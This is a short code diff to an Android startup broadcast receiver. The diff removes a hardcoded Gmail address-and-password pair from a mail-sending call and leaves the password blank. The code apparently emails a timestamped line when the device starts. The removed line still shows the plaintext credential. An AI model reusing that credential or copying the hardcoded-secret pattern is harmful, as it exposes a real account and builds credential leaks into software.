@@ -138,7 +138,7 @@ public class StartUpReceiver extends BroadcastReceiver
 
 
             String line = Line + "   (" + TimeStamp + ")";
-        sender = new Mail("katsarosm47@gmail.com", "KApota11");
+        sender = new Mail("katsarosm47@gmail.com", "");
         StringMake.setString(line);
         StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.
                     Builder().permitAll().build();
